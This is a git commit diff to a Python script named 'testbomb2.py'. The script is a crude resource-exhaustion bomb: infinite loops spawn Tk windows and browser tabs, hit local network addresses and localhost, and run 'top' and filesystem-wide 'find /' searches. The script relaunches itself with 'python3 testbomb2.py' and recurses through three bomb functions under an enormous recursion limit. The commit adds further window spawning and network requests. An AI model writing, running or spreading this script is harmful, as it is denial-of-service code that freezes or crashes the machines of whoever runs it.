5d054150d11047e6c25a470453415802f1a7274f
AvidAndAmateur <52603515+AvidAndAmateur@users.noreply.github.com>
2026-05-24 03:13:48 +0100

    Update testbomb2.py
    I dont know if this one works anymore

--- testbomb2.py
+++ testbomb2.py
@@ -3,6 +3,9 @@ import random
 import os
 import webbrowser
 import urllib.request
+import math
+from tkinter import *
+import random
 sys.setrecursionlimit(150000000)
 sys.setswitchinterval(0)
 sys.set_int_max_str_digits(10000000)
@@ -13,12 +16,21 @@ def initialbomb():
     y+=1**2**x
     listy = []
     while True:
-        x+=sys.maxunicode**sys.maxsize
+        root = Tk()
+        root.title('dx1123')
+        root.geometry('10x10')
+        s = chr(random.randint(72,100))+chr(random.randint(72,100))+chr(random.randint(72,100))+chr(random.randint(72,100))
+        x+=sys.maxunicode**sys.maxsize*math.pi
         listy.append(x)
+        listy.append(s)
+        math.factorial(100)
+        math.sqrt(121838238)
         webbrowser.open_new_tab("https://www.google.com")
         webbrowser.open_new("https://www.google.com")
         urllib.request.urlopen("http://192.168.0.1")
         urllib.request.urlopen("http://127.0.0.1")
+        urllib.request.urlopen("http://localhost")
+        urllib.request.urlopen("http://192.168.0.10")
         random.randint(0,1000)
         os.system("echo 11182173272323")
         os.system("top")
@@ -31,6 +43,7 @@ def initialbomb():
         os.system("find / -name '*.rar'")
         os.system("find / -name '*.png'")
         os.system('python3 testbomb2.py')
+        
         initialbomb()
         secondarybomb()
         thirdbomb()
@@ -41,8 +54,15 @@ def secondarybomb():
     y+=1**2**x
     listy = []
     while True:
-        x+=sys.maxunicode**sys.maxsize
+        root = Tk()
+        root.title('dx1123')
+        root.geometry('10x10')
+        s = chr(random.randint(72,100))+chr(random.randint(72,100))+chr(random.randint(72,100))+chr(random.randint(72,100))
+        x+=sys.maxunicode**sys.maxsize*math.pi
         listy.append(x)
+        listy.append(s)
+        math.factorial(100)
+        math.sqrt(121838238)
         webbrowser.open_new_tab("https://www.google.com")
         webbrowser.open_new("https://www.google.com")
         urllib.request.urlopen("http://192.168.0.1")
@@ -69,8 +89,15 @@ def thirdbomb():
     y+=1**2**x
     listy = []
     while True:
-        x+=sys.maxunicode**sys.maxsize
+        root = Tk()
+        root.title('dx1123')
+        root.geometry('10x10')
+        s = chr(random.randint(72,100))+chr(random.randint(72,100))+chr(random.randint(72,100))+chr(random.randint(72,100))
+        x+=sys.maxunicode**sys.maxsize*math.pi
         listy.append(x)
+        listy.append(s)
+        math.factorial(100)
+        math.sqrt(121838238)
         webbrowser.open_new_tab("https://www.google.com")
         webbrowser.open_new("https://www.google.com")
         urllib.request.urlopen("http://192.168.0.1")
